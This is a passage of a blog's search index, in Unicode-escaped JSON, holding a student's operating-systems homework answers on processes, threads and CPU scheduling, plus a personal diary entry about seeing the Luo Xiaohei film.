\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8fdb\u7a0b\u7684\u521b\u5efa\u3001\u5220\u9664\u3001\u8c03\u5ea6\u90fd\u662f\u901a\u8fc7\u5bf9PCB\u7684\u64cd\u4f5c\u6765\u5b8c\u6210\u7684\u3002 PCB\u5305\u542b\uff1a * \u8fdb\u7a0b\u72b6\u6001 * \u7a0b\u5e8f\u8ba1\u6570\u5668 * cpu\u5bc4\u5b58\u5668 * cpu\u8c03\u5ea6\u4fe1\u606f\uff1a\u5982\u8fdb\u7a0b\u4f18\u5148\u7ea7\uff0c\u8c03\u5ea6\u961f\u5217\u6307\u9488\u7b49\u3002 * \u5185\u5b58\u7ba1\u7406\u4fe1\u606f\uff1a\u57fa\u5740\uff0c\u9875\u8868\u6216\u6bb5\u8868\u7b49\u3002 * accounting info: cpu\u65f6\u95f4\u65f6\u95f4\uff0c\u65f6\u95f4\u754c\u9650\uff0c\u8fdb\u7a0b\u6570\u7b49\u3002 * I/O\u72b6\u6001\u4fe1\u606f\uff1a\u5206\u914d\u7684I/O\u5217\u8868\uff0c\u6253\u5f00\u7684\u6587\u4ef6\u5217\u8868\u7b49\u5f85\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3d","title":"3.D","text":"<p>When a process is created, the operating system needs to be done? * \u7ed9\u65b0\u8fdb\u7a0b\u5206\u914d\u7269\u7406\u548c\u903b\u8f91\u8d44\u6e90\uff08CPU\u65f6\u95f4\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff0cI/O\u8bbe\u5907\uff0c\u53ef\u6765\u81ea\u64cd\u4f5c\u7cfb\u7edf\u6216\u7ee7\u627f\u7236\u8fdb\u7a0b\u8d44\u6e90\uff09 * \u4f20\u9012\u521d\u59cb\u5316\u6570\u636e</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3e","title":"3.E","text":"<p>Please list the differences between message passing system and shared memory system. * \u5171\u4eab\u5185\u5b58\u7cfb\u7edf\u57fa\u672c\u53ea\u80fd\u5728\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\uff08\u53ef\u591a\u6838\uff09\u4e24\u8fdb\u7a0b\u4f20\u9012\u4fe1\u606f\uff0c\u800c\u4fe1\u606f\u4f20\u9012\u7cfb\u7edf\u65e2\u53ef\u4ee5\u662f\u540c\u4e00\u53f0\u8ba1\u7b97\u673a\u4e5f\u53ef\u4ee5\u662f\u901a\u8fc7\u7f51\u7edc\u8fde\u63a5\u7684\u4e0d\u540c\u8ba1\u7b97\u673a\u95f4\u8fdb\u7a0b\u4f20\u9012\u4fe1\u606f\u3002 * \u5171\u4eab\u5185\u5b58\u7cfb\u7edf\u53ea\u9700\u4e3a\u8fdb\u7a0b\u5206\u914d\u5171\u4eab\u5185\u5b58\uff0c\u901a\u4fe1\u7531\u8fdb\u7a0b\u8d1f\u8d23\uff0c\u800c\u4fe1\u606f\u4f20\u9012\u7cfb\u7edf\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u53c2\u4e0e\u8fdb\u884c\u8fdb\u7a0b\u95f4\u7684\u4fe1\u606f\u4f20\u9012\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e09\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#41","title":"4.1","text":"<p>Provide two programming examples in which multithreading does not provide better performance than a single-threaded solution.</p> <p>1) \u4efb\u4f55\u201c\u7ebf\u6027\u201d\u6267\u884c\u7684\u7a0b\u5e8f\uff08\u540e\u9762\u7684\u7a0b\u5e8f\u4e25\u91cd\u4f9d\u8d56\u524d\u9762\u6267\u884c\u7684\u7ed3\u679c\uff09\uff0c\u8fd9\u7c7b\u7a0b\u5e8f\u5373\u4f7f\u4f7f\u7528\u591a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u963b\u585e\u5176\u5b83\u7ebf\u7a0b\u7684\u6267\u884c\uff0c\u56e0\u6b64\u5e76\u4e0d\u4f1a\u6709\u66f4\u597d\u7684\u6027\u80fd\u3002</p> <p>2) \u53ea\u6267\u884c\u5355\u4e00\u4efb\u52a1\u7684\u7a0b\u5e8f\u3002\u591a\u7ebf\u7a0b\u5bf9\u4e8e\u6d4f\u89c8\u5668\uff0c\u5b57\u5904\u7406\u8f6f\u4ef6\u7b49\u591a\u4efb\u52a1\u8f6f\u4ef6\u662f\u6709\u7528\u7684\u3002\u5982\u6d4f\u89c8\u5668\u53ef\u4ee5\u5728\u63a5\u6536\u7f51\u7edc\u6570\u636e\u65f6\u540c\u65f6\u5237\u65b0\u9875\u9762\u3002\u4f46\u5bf9\u4e8e\u53ea\u6267\u884c\u5355\u4e2a\u4efb\u52a1\u7684\u7a0b\u5e8f\uff0c\u4fbf\u6ca1\u6709\u5fc5\u8981\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#42","title":"4.2","text":"<p>Describe the actions taken by a thread library to context switch between user-level threads.</p> <p>\u7528\u6237\u7ea7\u7ebf\u7a0b\u5e93\u7684\u4ee3\u7801\u90fd\u5b58\u5728\u4e8e\u7528\u6237\u7a7a\u95f4\uff0c\u56e0\u6b64\u8c03\u7528\u5e93\u4e2d\u7684\u51fd\u6570\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u672c\u5730\u8c03\u7528\u800c\u4e0d\u662f\u7cfb\u7edf\u8c03\u7528\u3002\u56e0\u4e3a\u7ebf\u7a0b\u4e3b\u8981\u5305\u62ec\u5bc4\u5b58\u5668\u7684\u503c\u548c\u6808\uff0c\u56e0\u6b64\u4e0a\u4e0b\u6587\u5207\u6362\u4f1a\u6d89\u5230\u5bc4\u5b58\u5668\u548c\u6808\u72b6\u6001\u7684\u4fdd\u5b58\u548c\u6062\u590d\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#43","title":"4.3","text":"<p>Under what circumstances does a multithreaded solution using multiple kernel threads provide better performance than a single-threaded solution on a single-processor system?</p> <p>1\uff09\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5206\u4e3a\u8bb8\u591a\u4e0d\u540c\u7684\u90e8\u5206\u3002\u5982\u7f51\u9875\u6d4f\u89c8\u5668\u6709\u4e00\u4e2a\u7ebf\u7a0b\u7528\u4e8e\u663e\u793a\u56fe\u50cf\u548c\u6587\u672c\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u4ece\u7f51\u7edc\u63a5\u6536\u6570\u636e\u3002 2\uff09\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u6267\u884c\u591a\u4e2a\u76f8\u4f3c\u7684\u4efb\u52a1\u3002\u5982\u7f51\u9875\u670d\u52a1\u5668\u53ef\u80fd\u8981\u5904\u7406\u4e0a\u5343\u4e2a\u5ba2\u6237\u5e76\u53d1\u8bf7\u6c42\u7f51\u9875\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#44","title":"4.4","text":"<p>Which of the following components of program state are shared across threads in a multithreaded process?</p> <ul> <li>a. Register values</li> <li>b. Heap memory</li> <li>c. Global variables</li> <li>d. Stack memory</li> </ul> <p>\u7b54\uff1a b,c</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter4-%E4%BD%9C%E4%B8%9A/#48","title":"4.8","text":"<p>Consider a multiprocessor system and a multithreaded program written using the many-to-many threading model. Let the number of user-level threads in the program be more than the number of processors in the system. Discuss the performance implications of the following scenarios.</p> <p>a. The number of kernel threads allocated to the program is less than the number of processors.</p> <p>b. The number of kernel threads allocated to the program is equal to the number of processors.</p> <p>c. The number of kernel threads allocated to the program is greater than the number of processors but less than the number of user-level threads.</p> <p>\u7b54\uff1a\u5f53\u5185\u6838\u7ebf\u7a0b\u5c0f\u4e8e\u5904\u7406\u5668\u6570\u76ee\u65f6\uff0c\u56e0\u4e3a\u7528\u6237\u7ebf\u7a0b\u53ea\u80fd\u901a\u8fc7\u5185\u6838\u7ebf\u7a0b\u8bbf\u95ee\u5904\u7406\u5668\uff0c\u56e0\u6b64\u4f1a\u6709\u4e00\u4e9b\u5904\u7406\u5668\u5904\u4e8e\u201c\u56f4\u89c2\u201d\u72b6\u6001\u3002\u5f53\u5185\u6838\u7ebf\u7a0b\u521a\u597d\u7b49\u4e8e\u5904\u7406\u5668\u65f6\uff0c\u5904\u7406\u5668\u7684\u6548\u7387\u76f8\u5bf9\u4e8ea\u4f1a\u63d0\u9ad8\uff0c\u7136\u800c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e86\u963b\u585e\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u5176\u5b83\u7528\u6237\u7ebf\u7a0b\u5c31\u65e0\u6cd5\u4f7f\u7528\u8be5\u5185\u6838\u8fdb\u7a0b\uff0cc\u7684\u60c5\u51b5\u5219\u5f25\u8865\u4e86\u8fd9\u4e00\u70b9\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u7ebf\u7a0b\u963b\u585e\u65f6\u53ef\u4ee5\u88ab\u5176\u5b83\u7528\u6237\u7ebf\u7a0b\u66ff\u6362\uff0c\u56e0\u6b64\u5904\u7406\u5668\u6548\u7387\u6700\u9ad8\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/","title":"\u7f57\u5c0f\u9ed1\u6218\u8bb0","text":"<p>\u4eca\u5929\u53bb\u770b\u5c0f\u9ed1\u7535\u5f71\u4e86\uff0c\u53d1\u751f\u4e86\u8bb8\u591a\u6709\u8da3\u7684\u4e8b\u60c5\u3002</p> <p>14:20\u51fa\u95e8\u65f6\u9047\u5230lfy\u4e86\uff0c\u4ed6\u4ec0\u4e48\u90fd\u4e0d\u5e26\u8981\u53bb\u671d\u5929\u95e8\u73a9\u3002\u6211\u4eec\u521a\u597d\u987a\u8def\uff0c\u90fd\u8981\u53bb\u4e09\u5ce1\u5e7f\u573a\uff08sb\u5730\u56fe\uff0c\u63a8\u8350\u6211\u5750\u534a\u4e2a\u5c0f\u65f6\u516c\u4ea4\u8f66\u7ed5\u8def\u53bb\uff0c\u5e78\u597dfy\u63d0\u9192\u4e86\u6211\u8d70\u8def\u53bb\uff0c\u53ea\u8d70\u4e86\u4e0d\u523010\u5206\u949f\u5c31\u5230\u4e86\uff09\u3002</p> <p>\u5230\u4e86\u7535\u5f71\u9662\u540e\uff0c\u53d1\u73b0\u7535\u5f71\u9662\u5176\u5b9e\u633a\u5c0f\u7684\uff0c\u5927\u5385\u5c31\u662f\u7b49\u5019\u5ba4\uff0c\u51e0\u6392\u706b\u8f66\u7ad9\u7684\u90a3\u79cd\u6905\u5b50\u3002\u7531\u4e8e\u6211\u65e9\u4e8640\u591a\u5206\u949f\uff0c\u4fbf\u5750\u5728\u90a3\u513f\u7b49\u3002</p> <p>\u5165\u573a\u4e86\uff0c\u679c\u7136\u6765\u7684\u4eba\u5f88\u5c11\u3002\u6211\u524d\u8fb9\u53ea\u6709\u4e00\u5bf9\u60c5\u4fa3\uff0c\u6211\u53f3\u8fb9\u6ca1\u4eba\uff0c\u5de6\u8fb9\u662f\u4e09\u4e2a\u59b9\u7eb8\uff08\u600e\u4e48\u611f\u89c9\u6709\u70b9\u5e78\u8fd0\uff0c\u201c\u81ea\u52a8\u53d8\u8272\u201d\uff09\uff0c\u540e\u9762\u6211\u53ea\u6ce8\u610f\u5230\u4e86\u4e00\u5bf9\u7537\u751f\uff0c\u4ee5\u53ca\u4e00\u4f4d\u5e74\u7eaa\u597d\u50cf\u8fd8\u633a\u5927\u7684\u963f\u59e8\uff08\u96be\u9053\u662f\u771f\u7231\uff1f\u611f\u89c9\u5927\u4eba\u770b\u52a8\u753b\u7535\u5f71\u7684\u53ea\u4f1a\u662f\u4e00\u5bb6\u4eba\u7684\u60c5\u51b5\u5440\uff09\u3002</p> <p>\u7535\u5f71\u5f00\u59cb\u4e86\uff08\u4e4b\u524d\u90fd\u662f\u9ed1\u5c4f\uff0c\u5728\u5f00\u59cb\u524d2\u5206\u949f\u5f00\u59cb\u653e\u5e7f\u544a\uff0c\u5982\u679c\u9ed1\u5c4f\u7684\u65f6\u95f4\u91cc\u653e\u548c\u5c0f\u9ed1\u6709\u5173\u7684\u5ba3\u4f20\u7247\u591a\u597d\u5440\uff0c\u4e0d\u77e5\u9053\u9996\u6620\u7684\u65f6\u5019\u4f1a\u4e0d\u4f1a\u653e\uff09\u3002</p> <p>\u64ad\u653e\u6ca1\u51e0\u5206\u949f\uff0c\u7a81\u7136\u9ed1\u5c4f\u4e86\u3002\u53f0\u4e0b\u5f00\u59cb\u53ea\u8a00\u7247\u8bed\u8d77\u6765\uff0c\u53ea\u542c\u89c1\u5de6\u8fb9\u7684\u4e09\u4e2a\u5973\u751f\u4e2d\u4e24\u4e2a\u5916\u5411\u70b9\u5973\u751f\u8c03\u4f83\u7b2c\u4e00\u6b21\u51fa\u6765\u5c31\u8fd0\u6c14\u8fd9\u4e48\u4e0d\u597d\uff0c\u8fd8\u8bf4\u8fd8\u4e0d\u5982\u53bb\u5403\u4e1c\u897f\uff0c\u63a5\u7740\u8bf4\u8981\u4e0d\u8981\u53bb\u9000\u7968\u3002\u4e0d\u8fc7\u4e2d\u95f4\u7684\u5973\u751f\u8bf4\u5979\u8fd8\u60f3\u770b\u770b\uff0c\u5979\u4eec\u53ef\u4ee5\u53bb\u95ee\u95ee\u80fd\u4e0d\u80fd\u9000\u7968\uff08\u8fd9\u624d\u662f\u771f\u7231\u5440\uff0c\u63a8\u65ad\u5e94\u8be5\u662f\u5979\u5b89\u5229\u5979\u4eec\u4e24\u4e2a\u8fc7\u6765\u770b\u7684\uff09\u3002\u7136\u540e\u6700\u5de6\u8fb9\u7684\u5973\u751f\u4fbf\u4e3b\u52a8\u51fa\u53bb\u53eb\u5de5\u4f5c\u4eba\u5458\u4e86\u3002\u51e0\u5206\u949f\u540e\u8bbe\u5907\u5f04\u597d\u4e86\uff0c\u7535\u5f71\u7ee7\u7eed\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/#\u89c2\u611f","title":"\u89c2\u611f:","text":"<p>\u53ea\u8981\u4f60\u5439\u7f57\u5c0f\u9ed1\uff0c\u6211\u4eec\u5c31\u662f\u597d\u670b\u53cb\u3002 \u5267\u60c5\u5341\u5206\u7d27\u51d1\uff0c\u57fa\u672c\u6ca1\u6709\u4ec0\u4e48\u5e9f\u8bdd\u3002\u5267\u60c5\u8854\u63a5\u6d41\u7545\u81ea\u7136\u3002\u7535\u5f71\u4ece\u4e2d\u95f4\u5f00\u59cb\uff0c\u4e00\u8def\u70ab\u9177\u6253\u6597\uff0c\u9ad8\u6f6e\u4e0d\u65ad\u3002\u7ed3\u5c3e\u4e5f\u4e0d\u62d6\u6c93\uff0c\u98ce\u606f\u5316\u4f5c\u68ee\u6797\uff0c\u5c0f\u9ed1\u8ba4\u65e0\u9650\u4e3a\u5e08\u7236\u7ee7\u7eed\u6d41\u6d6a\uff0c\u4e00\u5207\u90fd\u91ca\u7136\u4e86\u3002\u7ed3\u5c3e\u7684\u4e5f\u6709\u5f69\u86cb\uff0c\u5c71\u65b0\u5bf9\u5c0f\u767d\u8bf4\uff08\u5c71\u65b0\uff09\u8bf4\uff1a\u201c\u65e9\u665a\u6709\u4e00\u5929\u4f60\u4f1a\u9047\u5230\u4f60\u751f\u547d\u4e2d\u7684\u90a3\u53ea\u732b\u7684\u201d\uff0c\u8854\u63a5\u4e86TV\u7248\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E4%B8%AA%E4%BA%BA/2019/09/30/2019-09-30-%E7%BD%97%E5%B0%8F%E9%BB%91%E6%88%98%E8%AE%B0%EF%BC%8C%E7%A5%A8%E6%88%BF%E5%86%B2%E9%B8%AD%EF%BC%81/#\u603b\u7ed3","title":"\u603b\u7ed3:","text":"<p>\u6211\u559c\u6b22\u5c0f\u9ed1\u7684\u539f\u56e0\u5c31\u662f\u56e0\u4e3a\u4ed6\u91cc\u9762\u4e00\u5207\u90fd\u5f88\u7eaf\u7cb9\uff0c\u6ca1\u6709\u574f\u4eba\uff0c\u6ca1\u6709\u9634\u8c0b\u8be1\u8ba1\u3002\u6240\u4ee5\u770b\u5f97\u5341\u5206\u8212\u670d\u3002\u7535\u5f71\u6709\u4e30\u5bcc\u6709\u8da3\u7684\u7b11\u70b9\u3002\u610f\u5883\u4e5f\u5f88\u7f8e\u2014\u2014\u8302\u5bc6\u7684\u68ee\u6797\uff0c\u9e21\u72ac\u76f8\u95fb\u7684\u4e61\u6751\uff0c\u519c\u7530\uff0c\u591c\u665a\uff0c\u661f\u661f\uff0c\u5927\u6d77\uff0c\u7e41\u534e\u7684\u90fd\u5e02\uff0c\u4e00\u5207\u90fd\u662f\u90a3\u4e48\u7684\u5e73\u8861\uff0c\u90fd\u8ba9\u4eba\u611f\u53f9\u4e16\u754c\u771f\u7f8e\u3002\u4eba\u7269\u6027\u683c\u9c9c\u6d3b\u5206\u660e\u3002</p> <p>p.s. \u4eca\u5929\u665a\u4e0ab\u7ad9\u5237\u5c0f\u9ed1\u7684\u5404\u79cd\u5468\u8fb9\u89c6\u9891\uff0c\u53d1\u73b0\u539f\u6765\u8fd9\u79cd\u98ce\u683c\u7684\u52a8\u753b\u7528\u201c\u6cbb\u6108\u201d\u6765\u63cf\u8ff0\u6bd4\u8f83\u5408\u9002\u3002</p>","tags":["\u7f57\u5c0f\u9ed1"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e94\u7ae0\u4f5c\u4e1a CPU\u8c03\u5ea6","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#51-why-is-it-important-for-the-scheduler-to-distinguish-io-bound-programs-from-cpu-bound-programs","title":"5.1. Why is it important for the scheduler to distinguish I/O-bound programs from CPU-bound programs?","text":"<p>\u5bf9\u4e8e\u957f\u671f\u8c03\u5ea6\u7a0b\u5e8f\uff0c\u77e5\u9053\u8fdb\u7a0b\u662fIO\u7ea6\u675f\u7684\u8fd8\u662fCPU\u7ea6\u675f\u7684\u4e4b\u540e\uff0c\u4fbf\u53ef\u4ee5\u6309\u7167\u4e00\u5b9a\u6bd4\u4f8b\u7ec4\u5408\u88ab\u8c03\u5ea6\u7684\u8fdb\u7a0b\uff0c\u4f7f\u5f97CPU\u548cIO\u8bbe\u5907\u90fd\u4f1a\u4e00\u76f4\u5904\u4e8e\u8d1f\u8f7d\u72b6\u6001\uff0c\u4ece\u800c\u63d0\u9ad8\u8d44\u6e90\u7684\u4f7f\u7528\u7387\u3002 \u5bf9\u4e8e\u77ed\u671f\u8c03\u5ea6\uff08CPU\u8c03\u5ea6\uff09\uff0cIO\u7ea6\u675f\u7684\u8fdb\u7a0bCPU\u533a\u95f4\u90fd\u6bd4\u8f83\u77ed\uff0c\u800cCPU\u8d8a\u82cf\u8fdb\u7a0b\u5219\u6bd4\u8f83\u957f\uff0c\u56e0\u800c\u6839\u636e\u6700\u77ed\u4f5c\u4e1a\u4f18\u5148\u51c6\u5219\uff0c\u53ef\u4ee5\u4f18\u5148\u8c03\u5ea6IO\u7ea6\u675f\u8fdb\u7a0b\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#52-discuss-how-the-following-pairs-of-scheduling-criteria-conflict-in-certain-settings","title":"5.2. Discuss how the following pairs of scheduling criteria conflict in certain settings.","text":"<ul> <li> <p>a. CPU utilization and response time CPU\u5229\u7528\u7387\u4e0e\u4e0a\u4e0b\u6587\u4ea4\u6362\u9891\u7387\u6210\u8d1f\u76f8\u5173\uff0c\u800c\u54cd\u5e94\u65f6\u95f4\u4e0e\u4e4b\u6210\u6b63\u76f8\u5173\uff0c\u6545\u51b2\u7a81\u3002</p> </li> <li> <p>b. Average turnaround time and maximum waiting time \u4e3a\u4e86\u51cf\u5c0f\u5e73\u5747\u5468\u8f6c\u65f6\u95f4\uff0c\u901a\u5e38\u4f1a\u91c7\u7528\u77ed\u4f5c\u4e1a\u4f18\u5148\u7b97\u6cd5\uff0c\u800c\u8fd9\u4f1a\u4ee4\u957f\u4f5c\u4e1a\u7684\u7b49\u5f85\u65f6\u95f4\u589e\u5927\u3002</p> </li> <li> <p>c. I/O device utilization and CPU utilization \u4e3a\u4e86\u63d0\u9ad8I/O\u8bbe\u5907\u7684\u5229\u7528\u7387\uff0c\u9700\u8981\u4f18\u5148\u6267\u884cIO bound\u8fdb\u7a0b\uff0c\u56e0\u4e3aIO\u7ea6\u675f\u7684\u8fdb\u7a0bCPU\u533a\u95f4\u77ed\uff0c\u56e0\u800c\u5bfc\u81f4\u9891\u7e41\u7684\u4e0a\u4e0b\u6587\u4ea4\u6362\uff0c\u56e0\u800c\u964d\u4f4eCPU\u6548\u7387\u3002</p> </li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#54-consider-the-following-set-of-processes-with-the-length-of-the-cpu-burst-time-given-in-milliseconds","title":"5.4 Consider the following set of processes, with the length of the CPU-burst time given in milliseconds:","text":"Process Burst Time Priority $ P_1 $ 10 3 $ P_2 $ 1 1 $ P_3 $ 2 3 $ P_4 $ 1 4 $ P_5 $ 5 2 <p>The processes are assumed to have arrived in the order $ P_1,P_2,P_3,P_4,P_5 $, all at time 0. - a. Draw four Gantt charts illustrating the execution of these processes using FCFS , SJF , a nonpreemptive priority (a smaller priority number implies a higher priority), and RR (quantum = 1) scheduling.     1. FCFS         $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003 | $ P_2 $(1) \u2002 | $ P_3 $(2) \u2003 | $ P_4 \\((1) \u2002 |\\) P_5 $  (5) \u2003\u2003\u2002         --- | --- | --- | --- | ---     2. SJF         $ P_2 $(1) \u2002  | $ P_4 $(1) \u2002 | $ P_3 $(2) \u2003 | $ P_5 $  (5) \u2003\u2003\u2002 | $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003         --- | --- | --- | --- | ---     3. nopreemptive priority         $ P_2 $(1) \u2002  | $ P_5 $  (5) \u2003\u2003\u2002 | $ P_1 $ (10) \u2003\u2003\u2003\u2003\u2003 | $ P_3 $(2) \u2003 | $ P_4 $(1) \u2002         --- | --- | --- | --- | ---     4. Round Robin         $ P_1 $| $ P_2 $ | $ P_3 $ | $ P_4 $ |$ P_5 $ | $ P_1 $| $ P_3 $ | $ P_5 $ | $ P_1 $ |$ P_5 $ | $ P_1 $ | $ P_5 $ | $ P_1 $ | $ P_5 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ | $ P_1 $ |         --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | - b. What is the turnaround time of each process for each of the scheduling algorithms in part a?</p> <pre><code>&amp;ensp;  | FCFS  | SJF   | nopreemptive priority     | RR\n---     | ---   | ---   | ---                       | --- \n$ P_1 $ | 10    | 19    | 16                        | 19\n$ P_2 $ | 11    | 1     | 1                         | 2\n$ P_3 $ | 13    | 4     | 18                        | 7\n$ P_4 $ | 14    | 2     | 19                        | 4\n$ P_5 $ | 19    | 9     | 6                         | 14\n</code></pre> <ul> <li> <p>c. What is the waiting time of each process for each of the scheduling algorithms in part a?</p> FCFS SJF nopreemptive priority RR $ P_1 $ 0 9 6 9 $ P_2 $ 10 0 0 1 $ P_3 $ 11 2 16 5 $ P_4 $ 13 1 18 3 $ P_5 $ 14 4 1 9 sum 48 16 41 27 - d. Which of the schedules in part a results in the minimal average waiting time (over all processes)? <p>\u7b54\uff1a SJF with 3.2 ms</p> </li> <li> <p>a. FCFS</p> </li> <li>b. RR</li> <li>c. Multilevel feedback queues</li> </ul> <p>\u7b54\uff1a - FCFS\u54ea\u4e2a\u5148\u5230\u54ea\u4e2a\u4f18\u5148\uff0c\u56e0\u6b64\u5bf9\u5f85\u77ed\u8fdb\u7a0b\u548c\u957f\u8fdb\u7a0b\u662f\u5e73\u7b49\u7684\u3002 - RR\u7ed9\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u76f8\u540c\u7684\u65f6\u95f4\u7247\uff0c\u56e0\u6b64\u4e5f\u662f\u5e73\u7b49\u7684\u3002 - \u5bf9\u4e8e\u4e00\u79cd\u5178\u578b\u7684\u591a\u7ea7\u53cd\u9988\u961f\u5217\u7b97\u6cd5\uff08\u6709\u4e09\u4e2a\u961f\u5217\uff0c\u524d\u4e24\u4e2a\u4f7f\u7528RR\u7b97\u6cd5\uff0c\u65f6\u95f4\u7247\u5206\u522b\u4e3a8ms\uff0c16ms\uff0c\u7b2c\u4e09\u4e2a\u4f7f\u7528FCFS\u7b97\u6cd5\uff0c\u961f\u5217\u95f4\u4f7f\u7528\u62a2\u5360\u5f0f\u4f18\u5148\u7ea7\u7b97\u6cd5\uff09\uff0c\u77ed\u4f5c\u4e1a\u90fd\u4f1a\u5904\u4e8e\u524d\u9762\u7684\u961f\u5217\uff0c\u4ee5\u6b64\u77ed\u4f5c\u4e1a\u7684\u4f18\u5148\u7ea7\u66f4\u9ad8\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#510-explain-the-differences-in-the-degree-to-which-the-following-scheduling-algorithms-discriminate-in-favor-of-short-processes","title":"5.10 Explain the differences in the degree to which the following scheduling algorithms discriminate in favor of short processes:","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/10/08/2019-10-08-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%BD%9C%E4%B8%9A-CPU%E8%B0%83%E5%BA%A6/#5-please-prove-sjf-gives-the-minimum-average-waiting-time-for-a-given-set-of-processes-to-arrive-at-the-same-time","title":"5. Please prove: SJF gives the minimum average waiting time for a given set of processes to arrive at the same 